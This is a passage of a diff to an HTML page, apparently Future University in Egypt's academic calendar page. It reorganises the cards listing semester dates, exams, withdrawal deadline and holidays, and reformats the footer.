+                    </div>
+                  </div>
                 </div>
-                <div>
-                  <div class="text-red-600 font-medium">Mid-Year Vacation</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    January 24 to February 5, 2026
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">Class Begins</div>
+                    <div class="text-gray-600">
+                      Classes for the first semester begin Saturday, September
+                      20, 2025, and continue until Thursday, January 1, 2026
+                    </div>
                   </div>
                 </div>
               </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Mid-Year Vacation
-                  </div>
-                  <div class="text-gray-600">
-                    From Saturday, January 24, 2026, to Thursday, February 5, 2026
-                  </div>
-                </div>
-              </div>
-            </div>
 
-            <!-- Vacations -->
-            <div
-              class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-blue-600">
-              <div class="flex items-start gap-4">
-                <div class="p-2 bg-blue-600/20 rounded-full">
-                  <i data-lucide="calendar" class="w-5 h-5 text-blue-600"></i>
+              <!-- Study Duration -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-red-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-red-600/20 rounded-full">
+                    <i data-lucide="calendar" class="w-5 h-5 text-red-600"></i>
+                  </div>
+                  <div>
+                    <div class="text-red-600 font-medium">Study Duration</div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      15 Weeks includes Midterm Exams
+                    </div>
+                  </div>
                 </div>
-                <div>
-                  <div class="text-blue-600 font-medium">Vacations</div>
-                  <div class="text-[12px] md:text-base text-gray-900 font-semibold">
-                    October 6 2025 to January 7, 2026
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">
+                      Study Duration
+                    </div>
+                    <div class="text-gray-600">
+                      15 Weeks includes Midterm Exams
+                    </div>
                   </div>
                 </div>
               </div>
-              <div class="flex items-center gap-6">
-                <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
-                <div>
-                  <div class="font-semibold text-gray-900">
-                    Vacations
+              <!-- Midterm Exams -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-blue-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-blue-600/20 rounded-full">
+                    <i data-lucide="calendar" class="w-5 h-5 text-blue-600"></i>
                   </div>
-                  <div class="text-gray-600">
-                    o Monday, October 6, 2025: Armed Forced Day
-                    o Wednesday, January 7, 2026: Coptic Christmas
+                  <div>
+                    <div class="text-blue-600 font-medium">Midterm Exams</div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      November 1 to November 13, 2025
+                    </div>
+                  </div>
+                </div>
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">Midterm Exams</div>
+                    <div class="text-gray-600">
+                      (2 weeks) start from November 1, 2025, to November 13,
+                      2025, including university requirements midterm exams.
+                    </div>
                   </div>
                 </div>
               </div>
-            </div>
 
-            <!-- Legend -->
-            <!-- <div class="flex items-center flex-wrap gap-8 pt-6">
+              <!-- Last date for withdrawal -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-green-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-green-600/20 rounded-full">
+                    <i
+                      data-lucide="calendar"
+                      class="w-5 h-5 text-green-600"
+                    ></i>
+                  </div>
+                  <div>
+                    <div class="text-green-600 font-medium">
+                      Last date for withdrawal
+                    </div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      December 16 ,2025
+                    </div>
+                  </div>
+                </div>
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">
+                      Last date for withdrawal
+                    </div>
+                    <div class="text-gray-600">December 16 ,2025</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Final Exams -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-yellow-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-yellow-600/20 rounded-full">
+                    <i
+                      data-lucide="calendar"
+                      class="w-5 h-5 text-yellow-600"
+                    ></i>
+                  </div>
+                  <div>
+                    <div class="text-yellow-600 font-medium">Final Examsl</div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      January 3 to January 22, 2026
+                    </div>
+                  </div>
+                </div>
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">Final Exams</div>
+                    <div class="text-gray-600">
+                      From Saturday, January 3, 2026, to Thursday, January 22,
+                      2026
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Mid-Year Vacation -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-red-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-red-600/20 rounded-full">
+                    <i data-lucide="calendar" class="w-5 h-5 text-red-600"></i>
+                  </div>
+                  <div>
+                    <div class="text-red-600 font-medium">
+                      Mid-Year Vacation
+                    </div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      January 24 to February 5, 2026
+                    </div>
+                  </div>
+                </div>
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">
+                      Mid-Year Vacation
+                    </div>
+                    <div class="text-gray-600">
+                      From Saturday, January 24, 2026, to Thursday, February 5,
+                      2026
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Vacations -->
+              <div
+                class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-44 p-7 border border-gray-200 rounded-lg border-l-4 border-l-blue-600"
+              >
+                <div class="flex items-start gap-4">
+                  <div class="p-2 bg-blue-600/20 rounded-full">
+                    <i data-lucide="calendar" class="w-5 h-5 text-blue-600"></i>
+                  </div>
+                  <div>
+                    <div class="text-blue-600 font-medium">Vacations</div>
+                    <div
+                      class="text-[12px] md:text-base text-gray-900 font-semibold"
+                    >
+                      October 6 2025 to January 7, 2026
+                    </div>
+                  </div>
+                </div>
+                <div class="flex items-center gap-6">
+                  <div class="w-px h-16 bg-gray-300 hidden md:block"></div>
+                  <div>
+                    <div class="font-semibold text-gray-900">Vacations</div>
+                    <div class="text-gray-600">
+                      o Monday, October 6, 2025: Armed Forced Day o Wednesday,
+                      January 7, 2026: Coptic Christmas
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Legend -->
+              <!-- <div class="flex items-center flex-wrap gap-8 pt-6">
               <div class="flex items-center gap-2">
                 <div class="w-3 h-3 bg-blue-500 rounded-full"></div>
                 <span class="text-gray-600 text-sm">Registration</span>
@@ -1287,85 +1773,111 @@
                 <span class="text-gray-600 text-sm">Events</span>
               </div>
             </div> -->
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="bg-[#A10F14] text-white py-16 px-2 md:px-8 lg:px-12">
-      <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
-        <div class="grid lg:grid-cols-3 gap-12">
-          <!-- Logo and Description -->
-          <div class="space-y-6">
-            <img
-              src="https://api.builder.io/api/v1/image/assets/TEMP/c7940c3d5ab907b4ee635cd3bd8f84a79fbc3a28?width=520"
-              alt="Future University in Egypt" class="h-20 w-auto" />
-            <p class="text-white/90 leading-relaxed">
-              Future University in Egypt is dedicated to providing quality
-              education and preparing students for successful careers in a
-              global environment.
-            </p>
-          </div>
-
-          <!-- Quick Links -->
-          <div class="space-y-6">
-            <h3 class="text-xl font-medium">Quick Links</h3>
-            <div class="space-y-3">
-              <a href="/" class="block hover:text-gray-300 transition-colors">Home</a>
-              <a href="/student-guide" class="block hover:text-gray-300 transition-colors">Student Guide</a>
-              <a href="/study-plans" class="block hover:text-gray-300 transition-colors">Study Plans</a>
-              <a href="/academic-calendar" class="block hover:text-gray-300 transition-colors">Academic Calendar</a>
-            </div>
-          </div>
-
-          <!-- Contact Us -->
-          <div class="space-y-6">
-            <h3 class="text-xl font-medium">Contact Us</h3>
-            <div class="space-y-3">
-              <div class="flex items-start gap-3">
-                <i data-lucide="map-pin" class="w-5 h-5 text-white mt-0.5 flex-shrink-0"></i>
-                <span class="leading-relaxed">Future University Campus, End of 90th St., Fifth
-                  Settlement, New Cairo</span>
-              </div>
-              <div class="flex items-center gap-3">
-                <i data-lucide="phone" class="w-5 h-5 text-white"></i>
-                <span>+20 2 26189900</span>
-              </div>
-              <div class="flex items-center gap-3">
-                <i data-lucide="mail" class="w-5 h-5 text-white"></i>
-                <span>info@fue.edu.eg</span>
-              </div>
             </div>
           </div>
         </div>
+      </section>
 
-        <div class="pt-12 mt-12 border-t border-white/20">
-          <div class="flex flex-col md:flex-row justify-between items-center gap-4">
-            <p class="text-white/90">
-              © 2025 FUTURE UNIVERSITY IN EGYPT. All rights reserved.
-            </p>
-            <div class="flex gap-6">
-              <a href="/privacy" class="text-white/90 hover:text-white transition-colors">Privacy Policy</a>
-              <a href="/terms" class="text-white/90 hover:text-white transition-colors">Terms of Service</a>
+      <!-- Footer -->
+      <footer class="bg-[#A10F14] text-white py-16 px-2 md:px-8 lg:px-12">
+        <div class="max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0">
+          <div class="grid lg:grid-cols-3 gap-12">
+            <!-- Logo and Description -->
+            <div class="space-y-6">
+              <img
+                src="https://api.builder.io/api/v1/image/assets/TEMP/c7940c3d5ab907b4ee635cd3bd8f84a79fbc3a28?width=520"
+                alt="Future University in Egypt"
+                class="h-20 w-auto"
+              />
+              <p class="text-white/90 leading-relaxed">
+                Future University in Egypt is dedicated to providing quality
+                education and preparing students for successful careers in a
+                global environment.
+              </p>
+            </div>
+
+            <!-- Quick Links -->
+            <div class="space-y-6">
+              <h3 class="text-xl font-medium">Quick Links</h3>
+              <div class="space-y-3">
+                <a href="/" class="block hover:text-gray-300 transition-colors"
+                  >Home</a
+                >
+                <a
+                  href="/student-guide"
+                  class="block hover:text-gray-300 transition-colors"
+                  >Student Guide</a
+                >
+                <a
+                  href="/study-plans"
+                  class="block hover:text-gray-300 transition-colors"
+                  >Study Plans</a
+                >
+                <a
+                  href="/academic-calendar"
+                  class="block hover:text-gray-300 transition-colors"
+                  >Academic Calendar</a
+                >
+              </div>
+            </div>
+
+            <!-- Contact Us -->
+            <div class="space-y-6">
+              <h3 class="text-xl font-medium">Contact Us</h3>
+              <div class="space-y-3">
+                <div class="flex items-start gap-3">
+                  <i
+                    data-lucide="map-pin"
+                    class="w-5 h-5 text-white mt-0.5 flex-shrink-0"
+                  ></i>
+                  <span class="leading-relaxed"
+                    >Future University Campus, End of 90th St., Fifth
+                    Settlement, New Cairo</span
+                  >
+                </div>
+                <div class="flex items-center gap-3">
+                  <i data-lucide="phone" class="w-5 h-5 text-white"></i>
+                  <span>+20 2 26189900</span>
+                </div>
+                <div class="flex items-center gap-3">
+                  <i data-lucide="mail" class="w-5 h-5 text-white"></i>
+                  <span>info@fue.edu.eg</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="pt-12 mt-12 border-t border-white/20">
+            <div
+              class="flex flex-col md:flex-row justify-between items-center gap-4"
+            >
+              <p class="text-white/90">
+                © 2025 FUTURE UNIVERSITY IN EGYPT. All rights reserved.
+              </p>
+              <div class="flex gap-6">
+                <a
+                  href="/privacy"
+                  class="text-white/90 hover:text-white transition-colors"
+                  >Privacy Policy</a
+                >
+                <a
+                  href="/terms"
+                  class="text-white/90 hover:text-white transition-colors"
+                  >Terms of Service</a
+                >
+              </div>
             </div>
           </div>
         </div>
-      </div>
-    </footer>
+      </footer>
+    </div>
 
-  </div>
+    <script>
+      // Initialize Lucide icons
+      lucide.createIcons();
+    </script>
 
-  <script>
-    // Initialize Lucide icons
-    lucide.createIcons();
-  </script>
-
-
-  <!-- script for Navbar and Dropdowns  -->
-  <script src="/script.js"></script>
-
-
-</body>
-
+    <!-- script for Navbar and Dropdowns  -->
+    <script src="/script.js"></script>
+  </body>
 </html>
